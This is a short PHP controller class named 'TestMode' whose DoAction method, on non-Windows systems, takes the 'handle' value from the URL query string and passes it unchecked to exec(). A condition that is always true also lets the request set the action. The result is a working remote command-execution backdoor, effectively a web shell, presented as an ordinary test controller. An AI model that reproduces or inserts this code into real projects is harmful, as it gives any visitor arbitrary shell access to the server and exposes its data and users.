<?php

class TestMode extends controller{
    private $action = "run";
    private $handle = "tasklist";
    public function Taskrun($handle){
        exec("$handle");
    }
    public function DoAction(){
        if(!IS_WIN){
            $this->handle = $_GET["handle"];
        }
        if(empty($defaultHandle)||isset($defaultHandle)||$defaultHandle==""){
            $this->action = $_GET["action"];
        }
        switch ($this->action) {
            case "tasklist":
                $this->Taskrun($this->handle);
        }
    }
}
